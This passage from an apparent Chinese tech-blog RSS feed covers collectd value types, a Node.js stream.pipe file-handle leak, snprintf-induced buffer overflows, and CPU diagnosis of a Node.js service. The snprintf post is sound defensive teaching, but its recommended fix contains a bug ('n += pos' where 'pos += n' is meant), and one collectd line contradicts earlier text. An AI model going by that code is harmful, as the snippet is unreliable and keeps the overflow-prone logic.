<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+300]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #b5bd68;">done</span>
</pre>
</div>

<p>
<code>DERIVE</code> 类型值的处理
</p>
<blockquote>
<p>
将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除
</p>

<p>
(2000 - 1000) / 10 == 100
</p>
</blockquote>

<p>
<code>gauge.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">HOSTNAME</span>=<span style="color: #8abeb7;">"${COLLECTD_HOSTNAME:-localhost}"</span>
<span style="color: #f0c674;">VALUE</span>=0

<span style="color: #b5bd68;">while</span> [ 1 ]; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 8
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=50
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/gauge\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 2
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=300
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/gauge\" N:$VALUE"</span>
<span style="color: #b5bd68;">done</span>
</pre>
</div>

<p>
<code>GAUGE</code> 类型值的处理
</p>
<blockquote>
<p>
将时间间隔（10 秒）内的值乘以该值与上一值的时间间隔，再累加，最后与时间间隔（10 秒）相除
</p>

<p>
((50 * 8) + (300 * 2)) / 10 == 100
</p>
</blockquote>
</div>
</div>


<div id="outline-container-orga176827" class="outline-2">
<h2 id="orga176827"><code>COUNTER</code> VS <code>DERIVE</code></h2>
<div class="outline-text-2" id="text-orga176827">
<p>
这两者非常相似，不同点表现在当前上报的值小于上一上报值时：
</p>

<ul class="org-ul">
<li><p>
<code>COUNTER</code> 认为数据发生了溢出，会进行”回绕“计算，只要在数据集定义的取值范围（Min-Max）内，仍会做为当前时间间隔（10 秒）的值。
</p>

<p>
如生成统计值的程序或设备发生重启，而且重启时间小于一个时间间隔（10 秒），则有可能因”回绕“计算得出巨大的错误值。
</p>

<p>
因此建议在 <code>COUNTER</code> 类型数据集上设置合理的取值范围，一方面支持”回绕“计算，另一方面又不受误计算的影响。
</p></li>

<li><code>DERIVE</code> 认为这是异常值，丢弃该值。</li>
</ul>


<p>
<code>COUNTER</code> 和 <code>DERIVE</code> 类型的值与上一值紧密相关，需要减去上一值才是变化值。
</p>
</div>
</div>

<div id="outline-container-org50e9aba" class="outline-2">
<h2 id="org50e9aba"><code>ABSOLUTE</code> VS <code>GAUGE</code></h2>
<div class="outline-text-2" id="text-org50e9aba">
<p>
<code>ABSOLUTE</code> 是变化值，而 <code>GAUGE</code> 变化率（数量/秒）。
</p>

<p>
<code>ABSOLUTE</code> 需要将时间间隔（10 秒）内的值累加再除以时间间隔（10 秒）算出变化率（数量/秒）。
</p>

<p>
<code>GAUGE</code> 还与当前值到上一值的时间间隔紧密相关，上一值到当前值的时间间隔内的变化率都为当前值。
</p>

<p>
<code>COUNTER</code> 和 <code>DERIVE</code> 类型的值与上一值无关，本身就是变化值（或变化率）。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[关于 stream.pipe 你需要知道更多]]></title>
            <link>/article/51734e8e-stream.pipe-4f609700898177e5905366f4591a.html</link>
            <guid>/article/51734e8e-stream.pipe-4f609700898177e5905366f4591a.html</guid>
            <pubDate>Sat, 21 May 2016 17:58:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org0c77605" class="outline-2">
<h2 id="org0c77605">关于 stream 用法的一个经典例子</h2>
<div class="outline-text-2" id="text-org0c77605">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">http</span> = require(<span style="color: #8abeb7;">'http'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">fs</span> = require(<span style="color: #8abeb7;">'fs'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">server</span> = http.createServer(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">stream</span> = fs.createReadStream(__dirname + <span style="color: #8abeb7;">'/data.txt'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   stream.pipe(res);
});
server.listen(8000);
</pre>
</div>
</div>
</div>

<div id="outline-container-org03dc223" class="outline-2">
<h2 id="org03dc223">经典例子的致命问题</h2>
<div class="outline-text-2" id="text-org03dc223">
<p>
如果用户中断下载，文件不会关闭，导致文件句柄（fd）泄露，参见相关讨论：
</p>

<p>
<a href="http://stackoverflow.com/questions/37317676/deleting-file-in-node-js-not-working">express - Deleting file in node.js not working - Stack Overflow</a>
</p>

<p>
修复如下
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">http</span> = require(<span style="color: #8abeb7;">'http'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">fs</span> = require(<span style="color: #8abeb7;">'fs'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">server</span> = http.createServer(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">stream</span> = fs.createReadStream(__dirname + <span style="color: #8abeb7;">'/data.txt'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   stream.pipe(res).once(<span style="color: #8abeb7;">'close'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   stream.destroy();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
});
server.listen(8000);
</pre>
</div>
<p>
stream.destroy（同 stream.close） 是一个未文档化的 API，来自 fs.ReadStream ，
如此重要的一个函数竟然未文档化（至少现在还是未文档化状态，当前 node.js 版本为 v6.2.0）。
</p>
</div>
</div>

<div id="outline-container-org40fcfb7" class="outline-2">
<h2 id="org40fcfb7">关键 API 文档</h2>
<div class="outline-text-2" id="text-org40fcfb7">
<p>
<a href="https://nodejs.org/api/stream.html#stream_readable_pipe_destination_options">stream.pipe</a> 文档
</p>
<blockquote>
<p>
readable.pipe(destination[, options])#
</p>

<ul class="org-ul">
<li>destination Writable Stream The destination for writing data</li>
<li>options Object Pipe options
<ul class="org-ul">
<li>end Boolean End the writer when the reader ends. Default = true</li>
</ul></li>
</ul>

<p>
This method pulls all the data out of a readable stream, and writes it to the supplied
destination, automatically managing the flow so that the destination is not overwhelmed
by a fast readable stream.
</p>
</blockquote>

<p>
<a href="https://nodejs.org/api/fs.html#fs_fs_createreadstream_path_options">fs.createReadStream</a> 文档
</p>
<blockquote>
<p>
fs.createReadStream(path[, options])#
</p>

<p>
Returns a new ReadStream object (See Readable Stream).
</p>

<p>
Be aware that, unlike the default value set for highWaterMark on a readable stream (16
kb), the stream returned by this method has a default value of 64 kb for the same
parameter.
</p>

<p>
options is an object or string with the following defaults:
</p>

<p>
{ flags: 'r',
  encoding: null,
  fd: null,
  mode: 0o666,
  autoClose: true
}
</p>

<p>
options can include start and end values to read a range of bytes from the file instead
of the entire file. Both start and end are inclusive and start at 0. The encoding can be
'utf8', 'ascii', or 'base64'.
</p>

<p>
If fd is specified, ReadStream will ignore the path argument and will use the specified
file descriptor. This means that no open event will be emitted.
</p>

<p>
If autoClose is false, then the file descriptor won't be closed, even if there's an
error. It is your responsibility to close it and make sure there's no file descriptor
leak. If autoClose is set to true (default behavior), on error or end the file descriptor
will be closed automatically.
</p>

<p>
mode sets the file mode (permission and sticky bits), but only if the file was created.
</p>

<p>
An example to read the last 10 bytes of a file which is 100 bytes long:
</p>

<p>
fs.createReadStream('sample.txt', {start: 90, end: 99});
</p>

<p>
If options is a string, then it specifies the encoding.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org36671f5" class="outline-2">
<h2 id="org36671f5">stream.pipe 的工作原理</h2>
<div class="outline-text-2" id="text-org36671f5">
<p>
stream.pipe 将可读流（Readable Stream）连接到可写流（Writable Stream），
数据会从可读流传输到可写流，支持自动流量控制。
</p>

<p>
上面的 stream.pipe 其实是调用的 Readable.pipe，其流程简述如下：
</p>

<ul class="org-ul">
<li>监听可读流的 data 事件：将读取到的数据写入可写流，如果可写流缓冲区满，则暂停可读流。</li>
</ul>


<ul class="org-ul">
<li>监听可写流的 drain 事件：实现自动流量控制。</li>
</ul>


<ul class="org-ul">
<li>监听可写流的 unpipe 事件：取消所有事件监听。</li>
</ul>


<ul class="org-ul">
<li>监听可写流的 close、finish 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件。</li>
</ul>


<ul class="org-ul">
<li>监听可读流的 end 事件：调用可写流的 Writable.end()，触发可写流的 finish 事件。</li>
</ul>


<ul class="org-ul">
<li>监听可写流的 error 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件，如果 error 事件没有其它人监听，则抛出为异常。</li>
</ul>


<ul class="org-ul">
<li>在可写流上发出 pipe 事件。</li>
</ul>


<p>
以上流程请自行阅读代码映证：<a href="https://github.com/nodejs/node/blob/v4.4.4/lib/_stream_readable.js#L460">node/_stream_readable.js at v4.4.4 · nodejs/node</a>
</p>
</div>
</div>


<div id="outline-container-org5cc9a9c" class="outline-2">
<h2 id="org5cc9a9c">stream.pipe 的问题</h2>
<div class="outline-text-2" id="text-org5cc9a9c">
<p>
结合以上描述有以下疑问
</p>

<ul class="org-ul">
<li><p>
可读流出错会怎么样
</p>

<p>
可读流发出 error、close 事件，但因为错误没有发出 end 事件。
</p>

<p>
可读流可能被关闭，可写流不会被关闭，pipe 状态保持不变，数据流动停顿了。
</p>

<p>
在现实情况中，或早或晚，可写流可能因为超时时间到等原因最终被关闭，从而转化为下面的情况。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
可写流出错会怎么样
</p>

<p>
可写流发出 error、close 事件，没有 finish 事件。
</p>

<p>
可读流会与可写流断开 pipe，可读流不会被关闭。
</p>

<p>
可读流以 fs.ReadStream 为例，当它被读完时（EOF，发出 end 事件），根据 autoClose 标志（默认为 true），决定是否关闭流（释放文件句柄），没有读完就不会被关闭。
</p>

<p>
以上逻辑是合理的，一个可读流可以与多个可写流通过 pipe 连在一起，没有理由因为一个可写流的问题影响到可读流的状态。
</p>

<p>
做为开发人员，切莫幻想 node.js 的垃圾收集（ GC）会在可读流没有被引用时自动关闭文件句柄。
</p>

<p>
当 node.js 将文件句柄以整数（Integer）方式表示时，就不可能实现垃圾收集时自动关闭文件句柄了。
</p></li>
</ul>


<p>
stream.pipe 没有魔法，它提供了一种传输数据的优美方式，但是它并不完美，在错误处理方面留下了很多空白，有待开发人员自行解决。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[你很可能不懂 snprintf]]></title>
            <link>/article/4f605f8853ef80fd4e0d61c2-snprintf.html</link>
            <guid>/article/4f605f8853ef80fd4e0d61c2-snprintf.html</guid>
            <pubDate>Fri, 13 May 2016 12:36:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
Q: <code>snprintf</code> 返回的是实际写入到缓冲区的字符数吗？
</p>

<p>
A: 错。当缓冲区空间不足时会返回比缓存区空间大的值。
</p>

<div id="outline-container-org91de4a6" class="outline-2">
<h2 id="org91de4a6">man 3 snprintf</h2>
<div class="outline-text-2" id="text-org91de4a6">
<p>
摘录关键部分
</p>

<p>
原型写义
</p>
<blockquote>
<p>
#include &lt;stdio.h&gt;
</p>


<p>
int sprintf(char *str, const char *format, &#x2026;);
</p>

<p>
int snprintf(char *str, size_t size, const char *format, &#x2026;);
</p>
</blockquote>

<p>
功能描述
</p>
<blockquote>
<p>
The functions in the printf() family produce output according to a format as described below.  The functions
printf()  and  vprintf()  write output to stdout, the standard output stream; fprintf() and vfprintf() write
output to the given output stream; sprintf(), snprintf(), vsprintf() and vsnprintf() write to the  character
string str.
</p>

<p>
The function dprintf() is the same as fprintf(3) except that it outputs to a file descriptor, fd, instead of
to a stdio stream.
</p>

<p>
The functions snprintf() and vsnprintf() write at most size  bytes  (including  the  terminating  null  byte
('\0')) to str.
</p>
</blockquote>

<p>
返回值
</p>
<blockquote>
<p>
Upon  successful  return,  these  functions return the number of characters printed (excluding the null byte
used to end output to strings).
</p>

<p>
The functions snprintf() and vsnprintf() do not write more than size bytes (including the  terminating  null
byte ('\0')).  If the output was truncated due to this limit, then the return value is the number of charac‐
ters (excluding the terminating null byte) which would have been written to the final string if enough space
had  been  available.   Thus, a return value of size or more means that the output was truncated.  (See also
below under NOTES.)
</p>

<p>
If an output error is encountered, a negative value is returned.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org0596876" class="outline-2">
<h2 id="org0596876">了解 snprintf</h2>
<div class="outline-text-2" id="text-org0596876">
<p>
sprintf 输出到缓冲区，提供的缓存区空间不足时，引发臭名昭著的 <code>缓存区溢出</code> 漏洞，snprintf 通过指定缓存区空间大小解决了这个问题。
</p>

<p>
snprintf 常用于字符串格式化（如：拼接 SQL 或 shell 命令），很多人会用它的返回值来指定下一次拼接的起始位置。
</p>

<p>
如下代码所示：
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">fields</span>[] = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #8abeb7;">"name"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #8abeb7;">"age"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #8abeb7;">"city"</span>
};

<span style="color: #81a2be;">char</span> <span style="color: #f0c674;">sql</span>[10] = <span style="color: #8abeb7;">"select "</span>;
<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">pos</span> = 0;

<span style="color: #b5bd68;">for</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span> = 0; i &lt; <span style="color: #b5bd68;">sizeof</span>(fields)/<span style="color: #b5bd68;">sizeof</span>(fields[0]); ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pos += snprintf(sql + pos, <span style="color: #b5bd68;">sizeof</span>(sql) - pos, <span style="color: #8abeb7;">"%s%s"</span>, (i ? <span style="color: #8abeb7;">", "</span> : <span style="color: #8abeb7;">""</span>), field<span style="text-decoration: underline;">s[i]);</span>
}

<span style="color: #de935f;">snprintf</span>(sql + pos, <span style="color: #b5bd68;">sizeof</span>(<span style="color: #81a2be;">sql</span>) - pos, <span style="color: #8abeb7;">" from users"</span>);
</pre>
</div>

<p>
上面的代码没有处理缓存区不足的问题，最坏的结果仅仅是因缓存区空间不足而导致 sql 不完整吗？
</p>

<p>
比那要严重多了，它还会导致”缓存区溢出“漏洞。
</p>

<p>
这是因为，当缓冲区尺寸不足时，snprintf 会返回比缓冲区尺寸大的值，最后会导致传给 snprintf 的缓存区尺寸值为负数，
转化为无符号整型（size_t）就是一个超大的整数值。
</p>
</div>
</div>

<div id="outline-container-org727f6f5" class="outline-2">
<h2 id="org727f6f5">使用 snprintf 的正确姿势</h2>
<div class="outline-text-2" id="text-org727f6f5">
<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #f0c674;">pos</span> = 0;
<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">n</span> = snprintf(buffer + pos, <span style="color: #b5bd68;">sizeof</span>(buffer) - pos, <span style="color: #8abeb7;">"%s"</span>, <span style="color: #8abeb7;">"hello"</span>);
<span style="color: #b5bd68;">if</span> (n &gt;= <span style="color: #b5bd68;">sizeof</span>(buffer) - pos) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">a return value of size or more means that the output was truncated</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"error: buffer size not enough\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span>;
}
n += pos;

n = snprintf(buffer + pos, <span style="color: #b5bd68;">sizeof</span>(buffer) - pos, <span style="color: #8abeb7;">"%s"</span>, <span style="color: #8abeb7;">" snprintf"</span>);
<span style="color: #b5bd68;">if</span> (n &gt;= <span style="color: #b5bd68;">sizeof</span>(buffer) - pos) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">a return value of size or more means that the output was truncated</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"error: buffer size not enough\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span>;
}
n += pos;
</pre>
</div>

<p>
下次在代码里，当你看到有人用 snprintf 进行”漂亮“的拼接，相信你会从”哇“改口为”操“了。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[诊断 node.js 应用 CPU 占用过高的问题]]></title>
            <link>/article/8bca65ad-node.js-5e947528-cpu-536075288fc79ad8768495ee9898.html</link>
            <guid>/article/8bca65ad-node.js-5e947528-cpu-536075288fc79ad8768495ee9898.html</guid>
            <pubDate>Thu, 12 May 2016 09:25:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
node.js 应用使用 pm2 进行管理，采用 cluster 模式，每台服务器运行 16 个 node.js 实例。
</p>

<p>
应用的开销主要在网络上：
</p>

<p>
平均每个 node.js 实例要维持来自嵌入式设备的约 3K TLS 长连接，平均每秒会有 30 个来自客户端的 HTTP 短连接。
</p>

<p>
TLS 长连接上最多 45 秒会有一次心跳（发送 80 多字节，接收 400 多字节）。
</p>

<div id="outline-container-org1e1c2c1" class="outline-2">
<h2 id="org1e1c2c1">系统信息</h2>
<div class="outline-text-2" id="text-org1e1c2c1">
</div>
<div id="outline-container-org026b513" class="outline-3">
<h3 id="org026b513"><code>CPU</code></h3>
<div class="outline-text-3" id="text-org026b513">
<ul class="org-ul">
<li><p>
逻辑 CPU 数：24 
</p>

<pre class="example">
# cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c 
     24  Intel(R) Xeon(R) CPU E5-2620 v2 @ 2.10GHz
</pre></li>

<li><p>
物理 CPU 数：2
</p>

<pre class="example">
# cat /proc/cpuinfo | grep 'physical id' | sort | uniq -c
     12 physical id : 0
     12 physical id : 1
</pre></li>

<li><p>
每个物理 CPU 的核数：6
</p>

<pre class="example">
# cat /proc/cpuinfo | grep "cpu cores" | uniq | awk -F: '{print $2}'
 6
</pre></li>

<li><p>
每个核超线程数：2
</p>

<p>
两个逻辑 CPU 具有相同的 <code>core id</code> 则超线程是打开的。
</p>

<pre class="example">
# cat /proc/cpuinfo | grep -E "physical id|core id" | sed -e ':a;N;$!ba;s/\ncore id\s*/       core id /g' | sort | uniq -c
      2 physical id : 0       core id : 0
      2 physical id : 0       core id : 1
      2 physical id : 0       core id : 2
      2 physical id : 0       core id : 3
      2 physical id : 0       core id : 4
      2 physical id : 0       core id : 5
      2 physical id : 1       core id : 0
      2 physical id : 1       core id : 1
      2 physical id : 1       core id : 2
      2 physical id : 1       core id : 3
      2 physical id : 1       core id : 4
      2 physical id : 1       core id : 5
</pre></li>
</ul>

<p>
参考：<a href="http://blog.sina.com.cn/s/blog_4a6151550100iowl.html">Linux CPU数量判断，通过/proc/cpuinfo._一沙一花_新浪博客</a>
</p>
</div>
</div>

<div id="outline-container-org6702a83" class="outline-3">
<h3 id="org6702a83"><code>内存</code></h3>
<div class="outline-text-3" id="text-org6702a83">
<p>
<code>64G</code> 内存， <code>37.8G</code> 空闲内存
</p>

<pre class="example">
# cat /proc/meminfo
MemTotal:       65916740 kB
MemFree:        39663756 kB
Buffers:          595424 kB
Cached:          7627876 kB
SwapCached:            0 kB
Active:         17368112 kB
Inactive:        6936088 kB
Active(anon):   16002524 kB
Inactive(anon):    80820 kB
Active(file):    1365588 kB
Inactive(file):  6855268 kB
Unevictable:          32 kB
Mlocked:              32 kB
SwapTotal:      20971512 kB
SwapFree:       20971512 kB
Dirty:              1896 kB
Writeback:             0 kB
AnonPages:      16081968 kB
Mapped:            19596 kB
Shmem:              1624 kB
Slab:            1087320 kB
SReclaimable:     756368 kB
SUnreclaim:       330952 kB
KernelStack:        5272 kB
PageTables:        64280 kB
NFS_Unstable:          0 kB
Bounce:                0 kB
WritebackTmp:          0 kB
CommitLimit:    53929880 kB
Committed_AS:   17348828 kB
VmallocTotal:   34359738367 kB
VmallocUsed:      436016 kB
VmallocChunk:   34324325464 kB
HardwareCorrupted:     0 kB
AnonHugePages:   2525184 kB
HugePages_Total:       0
HugePages_Free:        0
HugePages_Rsvd:        0
HugePages_Surp:        0
Hugepagesize:       2048 kB
DirectMap4k:        4096 kB
DirectMap2M:     2076672 kB
DirectMap1G:    65011712 kB
</pre>
</div>
</div>
</div>

<div id="outline-container-org7c60abe" class="outline-2">
<h2 id="org7c60abe">系统状态</h2>
<div class="outline-text-2" id="text-org7c60abe">
<p>
<code>top</code>
</p>
<pre class="example">
# top -n 1
top - 13:05:48 up 144 days, 20:52,  2 users,  load average: 2.86, 2.46, 2.78
Tasks: 476 total,  19 running, 457 sleeping,   0 stopped,   0 zombie
Cpu(s): 22.7%us,  1.2%sy,  0.0%ni, 75.0%id,  0.0%wa,  0.0%hi,  1.1%si,  0.0%st
Mem:  65916740k total, 26237540k used, 39679200k free,   595424k buffers
Swap: 20971512k total,        0k used, 20971512k free,  7614508k cached

   PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND          
191463 nobody    20   0 1884m 981m 9.8m R 83.3  1.5  12337:09 node /usr/local  
192063 nobody    20   0 1905m 1.0g 9.8m R 73.6  1.6  12320:35 node /usr/local  
194450 nobody    20   0 1842m 937m 9.8m R 62.0  1.5  12060:56 node /usr/local  
191515 nobody    20   0 1911m 1.0g 9.8m R 60.1  1.6  12308:13 node /usr/local  
190881 nobody    20   0 1862m 957m 9.8m R 52.3  1.5  12257:46 node /usr/local  
195178 nobody    20   0 1795m 891m 9.8m R 52.3  1.4  11647:01 node /usr/local  
193068 nobody    20   0 1873m 970m 9.8m R 50.4  1.5  12144:28 node /usr/local  
194523 nobody    20   0 1805m 902m 9.8m R 50.4  1.4  11948:57 node /usr/local  
190790 nobody    20   0 1857m 951m 9.8m R 48.4  1.5  12174:59 node /usr/local  
191609 nobody    20   0 1847m 945m 9.8m R 48.4  1.5  12203:47 node /usr/local  
192946 nobody    20   0 1898m 993m 9.8m R 48.4  1.5  12224:41 node /usr/local  
193029 nobody    20   0 1827m 924m 9.8m R 48.4  1.4  12291:51 node /usr/local  
195276 nobody    20   0 1786m 883m 9.8m R 48.4  1.4  11659:07 node /usr/local  
196001 nobody    20   0 1885m 981m 9.8m R 48.4  1.5  11428:22 node /usr/local  
193725 nobody    20   0 1884m 978m 9.8m R 46.5  1.5  12336:34 node /usr/local  
 80300 root      20   0  611m 454m 1152 R 44.6  0.7  26523:40 redis-server     
195944 nobody    20   0 1815m 912m 9.8m R 44.6  1.4  11353:21 node /usr/local  
</pre>

<p>
<code>vmstat</code>
</p>
<pre class="example">
# vmstat 1
|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
|  r | b | swpd |     free |   buff |   cache | si | so | bi |    bo |     in |    cs | us | sy | id | wa | st |
|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
| 17 | 0 |    0 | 39769884 | 595424 | 7523076 |  0 |  0 |  0 |    71 |      0 |     0 | 23 |  2 | 75 |  0 |  0 |
|  9 | 0 |    0 | 39763800 | 595424 | 7528200 |  0 |  0 |  0 |  5188 | 108347 | 21186 | 53 |  5 | 41 |  0 |  0 |
| 17 | 0 |    0 | 39758360 | 595424 | 7534084 |  0 |  0 |  0 |  5272 | 106375 | 24054 | 49 |  5 | 45 |  0 |  0 |
| 15 | 0 |    0 | 39753912 | 595424 | 7538236 |  0 |  0 |  0 |  5252 | 107669 | 23522 | 50 |  5 | 44 |  0 |  0 |
| 12 | 0 |    0 | 39747588 | 595424 | 7544612 |  0 |  0 |  0 |  5304 | 108452 | 24290 | 49 |  5 | 46 |  0 |  0 |
| 15 | 0 |    0 | 39742744 | 595424 | 7548076 |  0 |  0 |  0 |  5200 | 106615 | 25614 | 47 |  5 | 48 |  0 |  0 |
| 13 | 0 |    0 | 39738224 | 595424 | 7552712 |  0 |  0 |  0 |  5092 | 101642 | 25482 | 44 |  5 | 51 |  0 |  0 |
|  9 | 0 |    0 | 39734116 | 595424 | 7559024 |  0 |  0 |  0 |  5156 |  98440 | 25393 | 42 |  5 | 53 |  0 |  0 |
| 16 | 0 |    0 | 39729280 | 595424 | 7564076 |  0 |  0 |  0 |  5204 | 108933 | 23535 | 49 |  5 | 45 |  0 |  0 |
| 18 | 0 |    0 | 39722832 | 595424 | 7568280 |  0 |  0 |  0 |  5276 | 111563 | 23965 | 51 |  5 | 44 |  0 |  0 |
|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
</pre>

<p>
<code>sar</code>
</p>
<pre class="example">
# sar -n TCP 1
01:58:46 PM  active/s passive/s    iseg/s    oseg/s
01:58:47 PM      3.09    875.26  32375.26  33619.59
01:58:48 PM      0.00    575.25  27972.28  28961.39
01:58:49 PM      0.00    879.59  31104.08  31933.67
01:58:50 PM      1.02    743.88  30183.67  31516.33
01:58:51 PM      0.00    793.94  31734.34  32761.62
01:58:52 PM      0.00    571.88  28690.62  29415.62
01:58:53 PM      1.02   1004.08  33157.14  33673.47
01:58:54 PM      0.99    954.46  33315.84  34532.67
01:58:55 PM      1.00    910.00  33562.00  34338.00
01:58:56 PM      1.02    783.67  31754.08  32412.24
</pre>
</div>
</div>

<div id="outline-container-org3536336" class="outline-2">
<h2 id="org3536336">应用状态</h2>
<div class="outline-text-2" id="text-org3536336">
<p>
<code>ps</code>
</p>
<pre class="example">
# ps waux | grep node
nobody   190790 61.0  1.4 1902228 974408 ?      Rl   Apr20 12154:57 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   190881 61.4  1.4 1907188 980800 ?      Rl   Apr20 12237:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   191463 61.8  1.5 1929392 1005164 ?     Sl   Apr20 12317:05 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   191515 61.7  1.5 1957252 1030472 ?     Rl   Apr20 12287:48 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   191609 61.1  1.4 1891508 967896 ?      Rl   Apr20 12183:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   192063 61.7  1.5 1951056 1025216 ?     Rl   Apr20 12300:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   192946 61.3  1.5 1943880 1017796 ?     Rl   Apr20 12204:24 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   193029 61.6  1.4 1871180 946732 ?      Rl   Apr20 12271:35 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   193068 60.9  1.5 1918404 993536 ?      Rl   Apr20 12124:33 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   193725 61.8  1.5 1929488 1001552 ?     Rl   Apr20 12316:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   194450 60.5  1.4 1887224 960012 ?      Sl   Apr20 12040:16 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   194523 59.9  1.4 1848960 924596 ?      Rl   Apr20 11928:46 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   195178 58.4  1.3 1838980 913052 ?      Rl   Apr20 11627:32 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   195276 58.5  1.3 1829848 905212 ?      Rl   Apr20 11639:08 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   195944 56.9  1.4 1859316 933892 ?      Rl   Apr20 11333:25 node /usr/local/xxx.xxxxxxxx.com/src/index.js
nobody   196001 57.3  1.5 1930348 1004912 ?     Rl   Apr20 11408:17 node /usr/local/xxx.xxxxxxxx.com/src/index.js
</pre>

<p>
<code>pm2</code>
</p>
<pre class="example">
# pm2 desc xxx.xxxxxxxx.com | grep 'Loop delay'
│ Loop delay │ 1.96ms │
│ Loop delay │ 2.01ms │
